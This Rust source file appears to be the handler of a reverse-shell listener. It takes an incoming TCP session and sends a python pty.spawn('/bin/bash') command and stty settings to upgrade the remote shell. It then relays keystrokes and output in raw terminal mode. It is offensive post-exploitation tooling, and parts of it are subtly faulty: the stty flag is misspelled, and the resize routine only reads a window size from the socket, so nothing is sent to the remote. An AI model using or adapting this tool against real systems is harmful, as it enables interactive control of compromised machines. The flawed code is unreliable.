use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::os::unix::io::AsRawFd;
use std::thread;
use std::time::Duration;

use libc::{TIOCGWINSZ, ioctl, winsize};
use nix::unistd::isatty;
use termion::raw::IntoRawMode;
use termion::screen::AlternateScreen;
use termios::{ECHO, ICANON, ISIG, TCSANOW, Termios, tcgetattr, tcsetattr};

// PTY stabilize
pub fn stabilise_shell(mut stream: &TcpStream) {
    println!("🔧Attempting to spawn a PTY shell...");
    //  Add python version check later
    let _ = stream.write_all(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n");
    let _ = stream.flush();
    thread::sleep(Duration::from_millis(300));

    let _ = stream.write_all(b"export TERM=xterm-256color\nstty raw -icannon echo \nclear\n");
    let _ = stream.flush();
    thread::sleep(Duration::from_millis(200));
}

// Resize the shell (nano etc)
pub fn resize_remote_shell(stream: &TcpStream) {
    let fd = stream.as_raw_fd();
    let mut ws: winsize = unsafe { std::mem::zeroed() };

    unsafe {
        ioctl(0, TIOCGWINSZ, &mut ws); // Get local terminal size
        ioctl(fd, TIOCGWINSZ, &ws); // Send to remote
    }
}

// Handle single shell session
pub fn handle_client(mut stream: TcpStream, addr: String) {
    if !isatty(0).unwrap_or(false) {
        eprintln!("⚠️  No TTY detected, shell may be unstable!");
    }

    let mut orig_term = Termios::from_fd(0).expect("Failed to get terminal attributes");
    let mut raw_term = orig_term.clone();

    raw_term.c_lflag &= !(ICANON | ECHO | ISIG);
    tcsetattr(0, TCSANOW, &raw_term).expect("Failed to set raw terminal mode");

    let stdout = io::stdout().into_raw_mode().unwrap();
    let _screen = AlternateScreen::from(stdout);
    resize_remote_shell(&stream);

    let mut stdin = io::stdin();
    let mut stdout = io::stdout().into_raw_mode().unwrap();
    let mut stream_in = stream.try_clone().unwrap();

    // Thread for sending user input to remote
    let input_thread = thread::spawn(move || {
        let mut buffer = [0u8; 1024];
        loop {
            match stdin.read(&mut buffer) {
                Ok(0) => break, // EOF
                Ok(n) => {
                    if stream_in.write_all(&buffer[..n]).is_err() {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    // Thread for reading from remote and printing locally
    let output_thread = thread::spawn(move || {
        let mut buffer = [0u8; 1024];
        loop {
            match stream.read(&mut buffer) {
                Ok(0) => break, // Remote closed
                Ok(n) => {
                    if stdout.write_all(&buffer[..n]).is_err() {
                        break;
                    }
                    stdout.flush().unwrap();
                }
                Err(_) => break,
            }
        }
    });

    let _ = input_thread.join();
    let _ = output_thread.join();

    tcsetattr(0, TCSANOW, &orig_term).expect("Failed to restore terminal state");
}

// Copyright (c) 2025 MuteAvery
// Licensed under the MIT License. See LICENSE file in the project root
